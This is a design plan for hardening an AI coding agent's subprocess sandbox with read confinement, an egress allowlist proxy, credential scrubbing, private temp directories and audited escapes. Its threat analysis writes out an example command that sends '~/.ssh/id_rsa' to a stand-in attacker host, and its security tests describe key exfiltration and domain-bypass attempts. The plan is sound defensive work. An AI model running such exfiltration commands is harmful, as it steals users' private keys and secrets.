# Sandbox Egress, Credentials, and Escape Controls — Extensive Implementation Plan

**Status:** Proposed
**Target:** `mantis_agent/sandbox.py` and every path that spawns a subprocess
**Objective:** Extend a write-only filesystem sandbox into a full confinement model with read restrictions, per-domain network egress, credential scrubbing and scoped injection, private temporary directories, and an auditable escape hatch.

## 1. Executive summary

`mantis_agent/sandbox.py` is 238 lines and does one thing well: it makes the filesystem read-only except for a declared set of writable roots, on macOS via `sandbox-exec` (seatbelt) and on Linux via `bubblewrap`. `SandboxPolicy.roots_for` normalizes and de-duplicates roots, `wrap_command` returns argv unchanged when disabled, and `fail_if_unavailable` decides whether a missing backend is a warning or a refusal. The module's own docstring states the philosophy plainly: *"`writable_roots` is the whole story for filesystem safety: everything else on the disk is readable but read-only."*

That sentence is also the problem statement. Five gaps follow directly from it.

**Reads are entirely unconfined.** The seatbelt profile opens with `(allow default)` then `(deny file-write*)`. Bubblewrap uses `--ro-bind / /`. Both grant read access to the entire filesystem: `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.mantis/settings.json`, every other project on the machine, and every browser profile. A sandboxed `cat ~/.ssh/id_rsa` succeeds today. For a threat model where the concern is an agent making unintended *changes*, that is coherent. For a threat model that includes exfiltration — which any agent with network access has — it is insufficient. Confidentiality is currently unprotected.

**Network is a single boolean.** `SandboxPolicy.network: bool = True` produces `(deny network*)` or `--unshare-net`. There is no middle ground. `pip install` and `git push` are the module's own cited reasons for keeping network on, and they are good ones — but keeping network on for `pip install` also permits `curl -d @~/.ssh/id_rsa https://attacker.example`. All-or-nothing forces users to choose between a working toolchain and egress control, and almost everyone will choose the working toolchain.

**The environment is inherited whole.** Nothing scrubs it. A sandboxed subprocess receives `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY`, and everything else in the parent's environment. The filesystem sandbox is irrelevant to a process that can simply read `os.environ` and POST it.

**`/tmp` is shared and writable.** `roots_for` unconditionally appends `tempfile.gettempdir()`, and `bubblewrap_argv` binds it read-write. Every sandboxed process — including every parallel subagent and every swarm worktree candidate — shares one temp directory. One agent can read another's intermediate files, and a compromised agent has a stable location to stage data. A private per-session temp directory is both safer and cheap.

**Escape is silent.** When `policy.enabled` is true but `available_backend()` returns `None` and `fail_if_unavailable` is false, `wrap_command` returns argv unchanged. The command runs completely unconfined while settings claim otherwise. The module's docstring anticipates this — *"refusing loudly beats running unconfined while a config file claims otherwise"* — but that reasoning currently only applies when the user opted into `fail_if_unavailable`. There is also no per-call escape mechanism: a command that genuinely needs to run unsandboxed has no approved path, so users disable the sandbox globally instead.

This plan closes all five without changing the default posture for existing users and without requiring a new dependency.

## 2. Goals

### User outcomes

- Restrict what an agent can *read*, not only what it can write, with sensible defaults that do not break ordinary development.
- Allow `pip install` and `git push` while blocking egress to arbitrary hosts.
- Know that a sandboxed command cannot read the API keys that pay for the session.
- Get a private temp directory per session so parallel agents cannot observe each other.
- Approve a specific command to run unsandboxed, once, with a visible prompt — instead of turning the sandbox off entirely.
- See exactly what confinement is in force, and be told loudly when it is not.

### Engineering goals

- Preserve `SandboxPolicy`, `wrap_command`, `load_policy`, `available_backend`, `sandbox_status`, `seatbelt_profile`, `bubblewrap_argv`, and `SandboxUnavailable` as public API with compatible behavior.
- Keep the "policy object is not threaded through every call site" property that `load_policy` and the `MANTIS_SANDBOX` env override deliberately provide.
- Add no required dependency. Egress control uses a local proxy built on the stdlib, matching `serve.py`'s precedent of a stdlib-only HTTP server.
- Degrade explicitly. Every capability advertises whether the current backend supports it; unsupported capabilities are reported, never silently skipped.
- Python 3.9–3.14; macOS and Linux, with Windows reporting unsupported rather than pretending.

### Success metrics

- A sandboxed process cannot read `~/.ssh`, `~/.aws`, or `~/.mantis` under default hardened settings.
- A sandboxed process's environment contains no credential-shaped variable unless explicitly injected.
- Egress to a non-allowlisted host fails while `pip install` from PyPI succeeds, in the same configuration.
- Two concurrent sandboxed sessions cannot see each other's temp files.
- Zero silent unconfined executions: every one produces a visible warning or a refusal.
- No measurable latency added to sandboxed command startup beyond the proxy connect (target: under 5 ms).

## 3. Non-goals

- A general-purpose container runtime. This is OS-level confinement of subprocesses, not Docker.
- Confining the Mantis process itself. The agent runs unconfined; it confines what it spawns.
- Windows sandboxing. Report unsupported and fail closed if required.
- Network confinement of the *model provider* connection. That is the agent's own traffic, not a sandboxed subprocess's.
- Replacing permissions. The sandbox is defense in depth beneath `f_permission_policy_engine_and_auto_mode.md`, not a substitute for it.
- Browser network policy — `n_browser_computer_use.md` owns that and has its own `BrowserPolicy`. The two should share URL-validation code but remain distinct policies.

## 4. Current integration points

- `mantis_agent/sandbox.py` — the entire module.
- `mantis_agent/builtin_tools/` — the bash tool and any tool that spawns a process; `wrap_command` is the single chokepoint and must remain so.
- `mantis_agent/permissions.py` — `_is_shell_tool`, `classify_bash_command`; sandbox state is a permission input and an escape is a permission decision.
- `mantis_agent/settings.py` — `load_settings(SETTING_SOURCES)`, from which `load_policy` already reads the `sandbox` key.
- `mantis_agent/watch.py` — `_watch_env()` and `_watch_cwd()` build the environment for watch commands; they must route through the same scrubbing.
- `mantis_agent/swarm.py` — worktree candidates are the strongest argument for private temp directories and per-candidate writable roots.
- `mantis_agent/subagent.py` — subprocess isolation in `e_subagent_trust_limits_and_isolation.md` consumes this policy.
- `mantis_agent/hooks.py` — command hooks from `g_typed_hooks_and_full_lifecycle.md` inherit the session sandbox.
- `mantis_agent/http.py` — URL validation shared with egress policy.
- `mantis_agent/tool_preview.py` — escape approval rendering.
- `mantis_agent/tui_fullscreen.py` — `/sandbox` command and status line.

## 5. Product model

### Capability matrix

Each backend advertises what it can enforce. Nothing is assumed.

| Capability | seatbelt (macOS) | bubblewrap (Linux) | none |
|---|---|---|---|
| Write confinement | yes | yes | no |
| Read confinement | yes (`deny file-read*` + allow subpaths) | yes (selective binds) | no |
| Network off | yes (`deny network*`) | yes (`--unshare-net`) | no |
| Per-domain egress | via proxy | via proxy + netns | no |
| Private tmp | yes | yes (`--tmpfs /tmp`) | no |
| PID isolation | no | yes (`--unshare-pid`) | no |
| Env scrubbing | yes (process-level) | yes (process-level) | yes |

Environment scrubbing works with no backend at all, which is worth noting: it is the one hardening measure available on every platform, including Windows, and should therefore be enabled independently of `policy.enabled`.

### Profiles

Rather than making users assemble a policy field by field, ship named profiles:

```text
off          no confinement (current default)
workspace    write-confined to project + private tmp; reads unrestricted;
             network on           ← behaviorally equal to today's `enabled: true`
hardened     workspace + read-confined + env scrubbed + egress allowlist
airgapped    hardened + network off
```

`workspace` must be behaviorally identical to today's `enabled: true` so upgrading changes nothing. `hardened` is the recommended target and the one documentation promotes.

## 6. Read confinement

### Seatbelt

The current profile is `(allow default)` + `(deny file-write*)`. Read confinement inverts the default for reads:

```scheme
(version 1)
(allow default)
(deny file-write*)
(deny file-read*)
(allow file-read* (subpath "/usr") (subpath "/bin") (subpath "/sbin")
                  (subpath "/System") (subpath "/Library")
                  (subpath "/opt/homebrew") (subpath "/private/var/select"))
(allow file-read* (subpath "<project-root>"))
(allow file-read* (subpath "<private-tmp>"))
(allow file-read-metadata)                    ; stat on anything; avoids breaking tools
(deny file-read* (subpath "<home>/.ssh")
                 (subpath "<home>/.aws")
                 (subpath "<home>/.mantis")
                 (subpath "<home>/.claude"))
```

Order matters in seatbelt: later rules win. The explicit denies come last so an over-broad read allow cannot re-expose a credential directory.

`file-read-metadata` stays permitted. Many toolchains `stat` paths they never open, and denying metadata produces confusing failures with no security benefit.

### Bubblewrap

Replace `--ro-bind / /` with selective binds:

```text
bwrap --unshare-pid --die-with-parent
      --ro-bind /usr /usr --ro-bind /bin /bin --ro-bind /lib /lib
      --ro-bind /lib64 /lib64 --ro-bind /etc/ssl /etc/ssl
      --ro-bind /etc/resolv.conf /etc/resolv.conf
      --ro-bind <project-root> <project-root>
      --bind <writable-root> <writable-root>
      --tmpfs /tmp --bind <private-tmp> /tmp
      --proc /proc --dev /dev
      --chdir <cwd>
```

Selective binding is strictly stronger than deny rules — an unbound path does not exist inside the namespace, so there is no rule to get wrong. Toolchain paths must be discovered rather than hardcoded: probe for the interpreter's prefix, the resolved paths of tools on `PATH`, and language-specific caches (`~/.cache/pip`, `~/.cargo`, `~/go/pkg`) and bind those read-only.

### Read roots configuration

```json
"readRoots": ["~/.cache/pip", "/opt/toolchains"],
"denyReadRoots": ["~/Documents/personal"]
```

Defaults for `hardened`: project root, private tmp, system paths, detected toolchain paths. Everything else denied, with `~/.ssh`, `~/.aws`, `~/.mantis`, `~/.claude`, and browser profile directories explicitly denied even if a broader allow would cover them.

### The failure mode to design for

Read confinement will break things — a build that reads a config from `~`, a test that loads a fixture from a sibling checkout. Make the failure legible:

- Capture stderr patterns indicating permission denial and, on failure, run a diagnostic that reports which paths the command attempted to read outside the allowed set (via `fs_usage` on macOS or `strace` where available, best-effort and off by default).
- Offer a one-line remediation: `add "readRoots": ["<path>"]` or approve an escape.
- Never silently widen the policy in response to a failure.

## 7. Egress control

### Why a proxy

Neither seatbelt nor bubblewrap can express "allow TCP to pypi.org, deny everything else" natively. Seatbelt's `network*` filters are coarse and effectively deprecated for fine-grained use; bubblewrap only offers namespace isolation. A local proxy is the portable mechanism, and it has the decisive advantage of operating on hostnames rather than IPs — which is what allowlists actually need, and what makes DNS-rebinding defenses possible.

### Design

Add `mantis_agent/sandbox/egress.py`: a loopback HTTP/HTTPS proxy on an ephemeral port, stdlib-only, one thread pool, started lazily on first sandboxed command in a session and stopped with the session.

- **HTTP:** parse the request line, extract the host, check the allowlist, forward or reject with `403`.
- **HTTPS:** handle `CONNECT`. The host is available in plaintext in the `CONNECT` line, so allowlisting works **without TLS interception**. Bytes are then tunneled opaquely. This is essential: Mantis must not become a TLS-intercepting man-in-the-middle on the user's traffic, and it must not need a trusted root certificate installed.
- Environment injected into the sandboxed process: `HTTP_PROXY`, `HTTPS_PROXY`, `http_proxy`, `https_proxy`, `NO_PROXY=localhost,127.0.0.1,::1`.
- On Linux, additionally deny raw network with `--unshare-net` plus a slirp-style loopback to the proxy where available, so a process that ignores the proxy variables has no path out. On macOS the proxy is advisory unless `network: false` is combined with a targeted allowance — document this honestly as a limitation rather than overclaiming.

### Allowlist semantics

```json
"egress": {
  "mode": "allowlist",
  "allowedDomains": ["pypi.org", "files.pythonhosted.org", "github.com",
                     "*.githubusercontent.com", "registry.npmjs.org"],
  "blockedDomains": [],
  "allowPrivateNetwork": false,
  "allowLoopback": true,
  "logRequests": true
}
```

- Matching is on DNS-label boundaries. `github.com` matches `github.com` and, with an explicit `*.` prefix, subdomains. `github.com.evil.net` never matches — this is the single most important test case.
- IDNs normalized with IDNA before matching.
- Requests to private, link-local, multicast, reserved, and metadata addresses (`169.254.169.254` and equivalents) are blocked regardless of the allowlist unless `allowPrivateNetwork` is set.
- DNS resolution happens in the proxy, and the resolved address is re-checked after resolution, mitigating rebinding.
- Redirects are not followed by the proxy; the client follows them and each hop is a new `CONNECT`/request that is independently checked.
- Denied requests are logged with host, port, and the command that made them, and surfaced in `/sandbox log`. A blocked exfiltration attempt is a security event the user should see.

### Presets

Ship named domain bundles so an allowlist is writable in one line:

```text
@python    pypi.org, files.pythonhosted.org
@node      registry.npmjs.org, nodejs.org
@rust      crates.io, static.crates.io, index.crates.io
@go        proxy.golang.org, sum.golang.org
@github    github.com, *.githubusercontent.com, codeload.github.com
```

`"allowedDomains": ["@python", "@github"]` expands at load.

## 8. Credentials

### Scrubbing

Build the child environment from an allowlist, not by subtracting from `os.environ`. Denylists lose to variables nobody anticipated.

Pass through by default: `PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`, `LANG`, `LC_*`, `TERM`, `TMPDIR` (rewritten to the private dir), `TZ`, `PWD`, and platform essentials. Plus anything matching a configured `passEnv` list.

Drop everything else, and specifically never pass any variable whose name matches the credential heuristic already used elsewhere in the codebase — `serve.py` has `_SECRET_KEY_RE = re.compile(r"key|token|secret|password|apikey", re.I)`, and `workflow_store.py` has `_SECRET_HINTS`. Consolidate those into one shared matcher in `mantis_agent/redaction.py` so three modules cannot drift.

This applies to `watch.py`'s `_watch_env()` too, which currently builds its own environment.

### Scoped injection

Some commands legitimately need a credential — `git push` needs auth, `gh` needs a token, `npm publish` needs a registry token. Support explicit, per-command injection:

```json
"credentials": [
  {
    "name": "GITHUB_TOKEN",
    "source": {"env": "GITHUB_TOKEN"},
    "forCommands": ["git", "gh"],
    "forDomains": ["github.com"]
  }
]
```

Rules:

- Injection requires both a command match and, when the credential is network-bearing, a domain match enforced by the proxy: the proxy refuses to forward a request carrying an injected credential to a host outside `forDomains`. This is the TLS-bound binding — without it, injecting a token into the environment simply reintroduces the exfiltration path the scrubbing closed.
- Since `CONNECT` tunnels are opaque, domain binding is enforced at connection time (host must be in `forDomains` before the tunnel opens) rather than by inspecting headers. Document this precisely; it is the difference between a real control and a claimed one.
- Sources may be `{"env": ...}`, `{"keychain": ...}`, or `{"command": ...}`; values are fetched at spawn time, never cached to disk, and never logged.
- Injected values are added to the recursive redactor for the session so they cannot appear in tool output, transcripts, traces, or activity records.

### Never inject

The provider API key. There is no legitimate reason for a sandboxed subprocess to hold the key that pays for the session, and a compromised subprocess holding it can run unbounded inference on the user's account. This is a hard rule with no configuration override.

## 9. Private temporary directories

Replace the shared `tempfile.gettempdir()` binding:

- Create `<session-state>/tmp/<session-id>/` with mode `0o700` at session start.
- Set `TMPDIR`, `TMP`, and `TEMP` to it in the child environment.
- Bind it as the sandbox's `/tmp` on Linux (`--tmpfs /tmp --bind <private> /tmp`) and as the writable temp root on macOS.
- Per-subagent and per-swarm-candidate subdirectories so parallel work is isolated from siblings, not just from other sessions.
- Remove on session end, with a bounded retry and a leak sweep at next startup for directories whose owning PID is gone.
- Keep `/dev/null` writable — the current code special-cases it correctly and must continue to.

`roots_for` changes behavior here: it currently always appends the system temp dir. Under a profile with private tmp it appends the private directory instead. Keep the old behavior under `workspace` for compatibility and adopt the private directory in `hardened`.

## 10. Escape controls

### The silent-escape fix

`wrap_command` currently returns argv unchanged when no backend is available and `fail_if_unavailable` is false. Change to:

- Emit a `SandboxDegraded` event once per session — visible in the TUI, logged, recorded in the activity registry, and included in `sandbox_status()`.
- Under `hardened` or `airgapped`, treat a missing backend as `fail_if_unavailable=true` regardless of the setting. A profile that promises confidentiality must not run unconfined.
- Under `workspace`, warn but proceed, preserving today's behavior.

### `dangerouslyDisableSandbox`

A per-call escape, so users stop disabling the sandbox globally:

```json
{"command": "docker build .", "dangerouslyDisableSandbox": true}
```

Requirements:

- Always requires interactive approval; never auto-allowed by `auto` mode, an allow rule, or `acceptEdits`.
- Approval is per-call. There is no "allow for session" for an escape, mirroring how `permissions.py` already refuses to remember a dangerous command: *"a dangerous command is never remembered for the session — it must be re-confirmed live on every call."*
- Denied outright in headless mode with no asker, consistent with the existing fail-closed rule.
- The prompt states plainly what confinement is being dropped:

```text
Run unsandboxed?
  docker build .
  drops: write confinement, read confinement, egress allowlist
  reason given: "docker needs the daemon socket"
```

- Configurable at `managed` or `user` trust to be unavailable entirely (`"allowEscape": false`).
- Every escape is recorded with command, reason, approver, and timestamp in the sandbox log.

## 11. Configuration

```json
{
  "sandbox": {
    "profile": "workspace",
    "enabled": false,
    "writableRoots": [],
    "readRoots": [],
    "denyReadRoots": [],
    "network": true,
    "failIfUnavailable": false,
    "privateTmp": true,
    "allowEscape": true,
    "env": {
      "scrub": true,
      "passEnv": [],
      "blockCredentialPattern": true
    },
    "egress": {
      "mode": "off",
      "allowedDomains": [],
      "blockedDomains": [],
      "allowPrivateNetwork": false,
      "allowLoopback": true,
      "logRequests": true,
      "proxyPort": 0
    },
    "credentials": []
  }
}
```

`profile` sets defaults for every other field; explicit fields override the profile. `enabled` remains supported and maps to `profile: "workspace"` when true, so existing configurations keep working untouched.

Environment overrides, extending the two that exist:

- `MANTIS_SANDBOX=0|1` (existing)
- `MANTIS_SANDBOX_NETWORK=0|1` (existing)
- `MANTIS_SANDBOX_PROFILE=off|workspace|hardened|airgapped`
- `MANTIS_SANDBOX_NO_ESCAPE=1`

Trust rule: environment and project-level settings may only **narrow** confinement. A project settings file cannot move the profile from `hardened` to `workspace`, add a `readRoot`, add an allowed domain, or enable escapes. This follows the trust layering in `f_permission_policy_engine_and_auto_mode.md` and matters more here than anywhere else — a cloned repository configuring its own sandbox down to nothing is the obvious attack.

## 12. TUI and CLI surface

```text
/sandbox                   full status: profile, backend, capabilities, roots,
                           egress mode, env scrubbing, private tmp, escapes used
/sandbox profile <name>    switch profile (narrowing always; widening per trust)
/sandbox test <command>    dry-run: show the exact wrapped argv and environment
/sandbox log [n]           denied egress, escapes, degradations
/sandbox doctor            diagnose backend availability with remediation
/sandbox allow <domain>    session-scoped egress addition (requires approval)
```

`/sandbox test` is the debugging tool that does not exist today:

```text
$ /sandbox test "pip install requests"
backend    seatbelt (macOS 15.2)
profile    hardened
argv       sandbox-exec -p <profile> /bin/sh -lc 'pip install requests'
writable   /Users/t/proj, /var/folders/.../mantis-tmp/ses-01J8
readable   /usr, /System, /opt/homebrew, ~/.cache/pip, /Users/t/proj
denied     ~/.ssh, ~/.aws, ~/.mantis, ~/.claude
egress     allowlist via 127.0.0.1:53411 → pypi.org, files.pythonhosted.org
env        18 vars passed, 7 dropped (3 credential-shaped)
```

Status line shows a compact confinement indicator, and the permission prompt shows sandbox state — approving a command means something different depending on whether it is confined, and the user deserves to know which.

## 13. Errors

```text
SandboxUnavailable            (existing; keep)
├── SandboxBackendMissing
├── SandboxCapabilityUnsupported   # e.g. per-domain egress with no backend
├── SandboxProfileError            # unknown or malformed profile
├── SandboxRootError               # unresolvable or unsafe root
├── EgressBlockedError             # host not allowlisted
├── EgressProxyError               # proxy failed to start or died
├── CredentialSourceError
├── CredentialScopeViolation       # injected credential to a wrong domain
├── PrivateTmpError
├── EscapeDeniedError
└── SandboxDegraded                # warning-class, not an exception
```

`SandboxUnavailable` must remain the existing `RuntimeError` subclass with an unchanged import path; the new types derive from it where they are fatal.

## 14. Delivery phases

### Phase 0 — Spike and capability audit

1. Verify seatbelt read-deny rules on current macOS; confirm rule ordering semantics and `file-read-metadata` behavior.
2. Verify bubblewrap selective binds against real toolchains (Python venv, node, cargo, go).
3. Prototype the `CONNECT` proxy and measure connect latency.
4. Enumerate toolchain paths that must be discoverable rather than hardcoded.
5. Determine honestly what macOS can enforce for egress when the process ignores proxy variables, and document the limit.

**Exit:** capability matrix validated on both platforms; no overclaimed capability.

### Phase 1 — Profiles and environment scrubbing

1. Add profiles with `workspace` behaviorally identical to today.
2. Implement allowlist-based environment construction.
3. Consolidate credential-pattern matching into `redaction.py`.
4. Route `watch.py`'s `_watch_env()` through it.
5. Add `/sandbox` status showing the environment summary.

**Exit:** no credential-shaped variable reaches a subprocess; existing behavior unchanged under `workspace`. Environment scrubbing ships independently of any backend and is valuable on its own.

### Phase 2 — Private temp

1. Create per-session and per-child private temp directories.
2. Rewrite `TMPDIR`/`TMP`/`TEMP`.
3. Bind as `/tmp` on Linux; add as writable root on macOS.
4. Add cleanup, retry, and an orphan sweep at startup.
5. Keep `/dev/null` handling intact.

**Exit:** parallel sessions and subagents cannot observe each other's temp files.

### Phase 3 — Read confinement

1. Implement seatbelt read rules with correct ordering and trailing explicit denies.
2. Implement bubblewrap selective binds with toolchain discovery.
3. Add `readRoots` / `denyReadRoots`.
4. Add the diagnostic for read-denial failures with actionable remediation.
5. Add `hardened` profile.

**Exit:** credential directories unreadable; ordinary builds still work under `hardened`.

### Phase 4 — Egress

1. Implement the proxy with HTTP and `CONNECT` handling.
2. Implement label-boundary domain matching, IDNA, and address classification.
3. Add post-resolution re-check for rebinding.
4. Add presets, logging, and `/sandbox allow`.
5. Combine with `--unshare-net` on Linux for enforcement rather than advice.

**Exit:** allowlisted installs succeed, non-allowlisted egress fails, `github.com.evil.net` is blocked.

### Phase 5 — Credentials and escape

1. Implement scoped injection with command and domain binding.
2. Enforce domain binding at `CONNECT` time in the proxy.
3. Register injected values with the session redactor.
4. Implement `dangerouslyDisableSandbox` with per-call approval and logging.
5. Fix the silent-escape path with `SandboxDegraded` and profile-dependent hard failure.

**Exit:** credentials reach only their intended hosts; no unconfined execution is silent.

### Phase 6 — Hardening

1. Adversarial review: read-rule ordering, bind escapes, proxy bypass, credential leakage, symlink escapes out of writable roots.
2. Fuzz domain matching and URL parsing.
3. Leak tests for temp directories, proxy threads, and processes.
4. Soak test with parallel swarm candidates.
5. Promote `hardened` as the documented recommendation.

## 15. Testing strategy

### Unit

- `roots_for`: de-duplication, symlink resolution, unresolvable paths, private-tmp substitution.
- Profile resolution and field override precedence.
- Seatbelt profile generation: rule ordering, path quoting via `_quote_sb`, deny-after-allow.
- Bubblewrap argv generation for every combination of roots, network, tmpfs, and cwd.
- Environment construction: allowlist pass, credential-pattern drop, `passEnv` addition, `TMPDIR` rewrite.
- Domain matching: exact, wildcard, label boundary, IDN, uppercase, trailing dot, `github.com.evil.net`.
- Address classification: loopback, private, link-local, metadata, multicast, reserved, public.
- Preset expansion.
- Credential scope: command match, domain match, both, neither.
- Capability matrix reporting per backend.

### Integration

- Real `sandbox-exec` on macOS: write outside a root fails; read of `~/.ssh` fails under `hardened`; read of project succeeds.
- Real `bwrap` on Linux: same assertions via selective binds.
- Proxy: allowlisted `CONNECT` succeeds, non-allowlisted fails with a logged event.
- `pip install` succeeds under `hardened` with `@python`.
- `curl` to a non-allowlisted host fails under the same policy.
- Private tmp: two sessions write same-named files without collision or visibility.
- Escape: prompt shown, approval required, denied in headless.
- `SandboxDegraded` fires when the backend is removed from `PATH`.

### End-to-end

- Full session under `hardened` running a realistic build and test cycle.
- Swarm with three candidates, each with its own tmp and writable root.
- Watch command inheriting scrubbed environment.
- Command hook inheriting the sandbox.
- `/sandbox test` output matches actual execution.

### Security

- **Exfiltration:** sandboxed process attempts to read `~/.ssh/id_rsa` and POST it; blocked at both read and egress.
- **Env leak:** assert no credential-shaped variable in `/proc/<pid>/environ` (Linux) or via `ps -E` (macOS) for the child.
- **Provider key:** assert the API key is never present in a child environment under any configuration.
- **Domain bypass:** `github.com.evil.net`, `GITHUB.COM`, `github.com.`, IDN homographs, and IP-literal hosts.
- **Rebinding:** DNS returning a public address at check time and a private one at connect time.
- **Metadata:** `169.254.169.254` and cloud equivalents blocked even when allowlisted by pattern.
- **Symlink escape:** symlink inside a writable root pointing outside it; write must fail.
- **Proxy bypass:** process that unsets `HTTP_PROXY` — asserted blocked on Linux, documented as advisory on macOS.
- **Trust escalation:** project settings attempting to widen profile, add read roots, add domains, or enable escapes.
- **Credential scope violation:** injected `GITHUB_TOKEN` with a `CONNECT` to a non-GitHub host.
- **Escape replay:** approval for one command does not authorize a different one.

### Performance and reliability

- Sandbox wrap overhead per command.
- Proxy connect latency and throughput on a large `pip install`.
- Temp directory creation and cleanup cost.
- Leak detection: no orphan proxy threads, temp directories, or processes after 500 sandboxed commands.
- Concurrent sandboxed commands under load.

## 16. Documentation

- `docs/guides/sandbox.md` — profiles, what each confines, how to choose, troubleshooting read denials.
- `docs/guides/sandbox-egress.md` — proxy model, allowlists, presets, why HTTPS is not intercepted, platform limitations stated plainly.
- `docs/guides/sandbox-credentials.md` — scrubbing, scoped injection, why the provider key is never injected.
- `docs/api/sandbox.md` — `SandboxPolicy`, `wrap_command`, `sandbox_status`, capability matrix.
- A threat-model page stating precisely what each profile does and does not protect against, including the macOS proxy limitation.
- Update `mkdocs.yml` and `web/lib/docsNav.ts`.

## 17. File-level implementation map

New:

- `mantis_agent/sandbox/__init__.py` (re-exports the existing `__all__` verbatim)
- `mantis_agent/sandbox/policy.py` — profiles, config, capability matrix
- `mantis_agent/sandbox/seatbelt.py`
- `mantis_agent/sandbox/bubblewrap.py`
- `mantis_agent/sandbox/env.py` — environment construction
- `mantis_agent/sandbox/egress.py` — proxy
- `mantis_agent/sandbox/domains.py` — matching, IDNA, address classification
- `mantis_agent/sandbox/credentials.py`
- `mantis_agent/sandbox/tmpdir.py`
- `mantis_agent/sandbox/escape.py`
- `mantis_agent/redaction.py` — consolidated secret matcher
- `tests/test_sandbox_policy.py`
- `tests/test_sandbox_seatbelt.py`
- `tests/test_sandbox_bubblewrap.py`
- `tests/test_sandbox_env.py`
- `tests/test_sandbox_domains.py`
- `tests/test_sandbox_egress.py`
- `tests/test_sandbox_credentials.py`
- `tests/test_sandbox_tmpdir.py`
- `tests/test_sandbox_escape.py`
- `tests/test_sandbox_security.py`
- `docs/guides/sandbox.md`
- `docs/guides/sandbox-egress.md`
- `docs/guides/sandbox-credentials.md`

Modified:

- `mantis_agent/sandbox.py` → package `__init__` re-exporting `__all__`
- `mantis_agent/settings.py` — profile config and trust narrowing
- `mantis_agent/permissions.py` — sandbox state as input, escape as a decision
- `mantis_agent/watch.py` — `_watch_env()` through the shared builder
- `mantis_agent/swarm.py` — per-candidate roots and tmp
- `mantis_agent/subagent.py` — subprocess isolation consumes the policy
- `mantis_agent/tool_preview.py` — escape and sandbox-state rendering
- `mantis_agent/tui_fullscreen.py` — `/sandbox` commands and indicator
- `mantis_agent/http.py` — shared URL validation
- `mantis_agent/tracing.py` — egress and escape spans
- `tests/public_api_surface.txt` — intentional update

## 18. Risks and mitigations

| Risk | Mitigation |
|---|---|
| Read confinement breaks toolchains | Discovered toolchain paths, `hardened` opt-in, actionable diagnostics, easy `readRoots` |
| Proxy is bypassed by a process ignoring env vars | `--unshare-net` on Linux for real enforcement; macOS limitation documented, not overclaimed |
| TLS interception expectation | Explicitly not done; allowlisting via `CONNECT` host only |
| Domain matching bypass | Label-boundary matching, IDNA, post-resolution re-check, dedicated test corpus |
| Credential injection reintroduces exfiltration | Domain binding enforced at connect time; provider key never injectable |
| Private tmp breaks tools expecting `/tmp` | Bound as `/tmp` inside the namespace on Linux; `TMPDIR` set everywhere |
| Temp directories leak | Session cleanup, retry, startup orphan sweep |
| Escape becomes routine | Per-call approval only, never remembered, always logged, disableable by policy |
| Silent unconfined execution persists | `SandboxDegraded` event; hard failure under `hardened`/`airgapped` |
| Project settings weaken the sandbox | Trust layering: lower layers may only narrow |
| Splitting the module breaks imports | Package `__init__` re-exports `__all__`; snapshot test |
| Windows users see a false sense of safety | Capability matrix reports unsupported; env scrubbing still applies and is stated as the only protection |
| Proxy becomes a session-lifetime resource leak | Lazy start, session-scoped stop, leak test |

## 19. Acceptance checklist

- [ ] Profiles implemented; `workspace` is behaviorally identical to today's `enabled: true`.
- [ ] Environment is built from an allowlist; no credential-shaped variable passes.
- [ ] The provider API key is never present in any child environment.
- [ ] Private temp directories are per session and per child, cleaned up and swept.
- [ ] Read confinement works on both backends; `~/.ssh`, `~/.aws`, `~/.mantis` are unreadable under `hardened`.
- [ ] Egress allowlist enforces label-boundary matching and blocks metadata/private targets.
- [ ] `pip install` works under `hardened` with the `@python` preset.
- [ ] Credentials inject only for matching commands and are bound to their domains at connect time.
- [ ] `dangerouslyDisableSandbox` requires per-call approval, is never remembered, and is denied headless.
- [ ] No unconfined execution is silent; `SandboxDegraded` is visible.
- [ ] `hardened` and `airgapped` refuse to run when no backend is available.
- [ ] Lower trust layers can only narrow confinement.
- [ ] `/sandbox test` shows the exact argv and environment.
- [ ] Capability matrix is reported accurately per backend, including Windows unsupported.
- [ ] Public API surface unchanged except intentional additions.
- [ ] `ruff check` and the full pytest suite pass.

## 20. Recommended implementation order

1. **Environment scrubbing first.** It needs no backend, works on every platform, closes the largest hole (API keys in every subprocess), and is a small diff. Ship it alone.
2. **Private temp second.** Small, independent, and immediately valuable for parallel agents and swarms.
3. **Profiles third**, with `workspace` proving that nothing changed for existing users.
4. **Read confinement fourth.** This is the first change that can break user workflows, so it lands behind the opt-in `hardened` profile with diagnostics already in place.
5. **Egress fifth.** The proxy is the largest new component; it deserves its own release and its own security review.
6. **Credential injection sixth** — and only after the proxy exists, because domain binding depends on it. Injecting credentials before the proxy can bind them would be a regression.
7. **Escape controls seventh**, including fixing the silent-degradation path.
8. Harden, then promote `hardened` in documentation, and let `e_subagent_trust_limits_and_isolation.md` build subprocess isolation on top of a policy that is now worth inheriting.
